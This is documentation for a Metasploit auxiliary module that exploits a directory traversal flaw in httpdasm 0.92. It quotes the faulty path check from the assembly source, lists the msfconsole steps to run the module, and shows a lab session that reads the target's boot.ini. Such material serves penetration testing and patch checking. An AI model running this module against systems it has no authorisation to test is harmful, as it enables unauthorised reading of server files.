## Description

  This module exploits a directory traversal vulnerability to read files from a server running httpdasm v0.92.

## Vulnerable Application

  httpdasm 0.92

  The vulnerability can be found in HTTPRqst.asm file.

  The beginning of the ServeContent routine attempts to check file path with SafeFilePath:

  ```
  1403 invoke SafeFilePath, __this
  1404 .if (!eax) ;File is not safe
  1405 mov m_dwCode, HTTP_STATUS_FORBIDDEN
  1406 jmp doneHTTPGet
  1407 .endif
  1408 invoke ExtractFilename, __this
  1409 .if (!eax)
  1410 mov m_dwCode, HTTP_STATUS_URI_TOO_LONG ;max URI is 256 here
  1411 jmp doneHTTPGe$
  1412 .endif
  ```

  The SafeFilePath checks for directory traversal with these possible values such as "..", "//", "\", ":", which is inadequate to prevent a traversal attack:

  ```
  502 .if ((cx == '..') || (cx == '//') || (cl == '\') || (cl == ':'))
  1503 return 0
  1504 .endif
  ```


## Verification Steps

  1. Start `msfconsole`
  2. `use [auxiliary/scanner/http/httpdasm_directory_traversal]`
  3. `set RHOSTS [IP]`
  4. `run`

## Scenarios

### Tested on Windows XP x86

  ```
  msf5 > use auxiliary/scanner/http/httpdasm_directory_traversal
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > set rhosts 192.168.37.128
  rhosts => 192.168.37.128
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > run

  [boot loader]
  timeout=30
  default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
  [operating systems]
  multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect

  [*] Auxiliary module execution completed
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) >
  ```
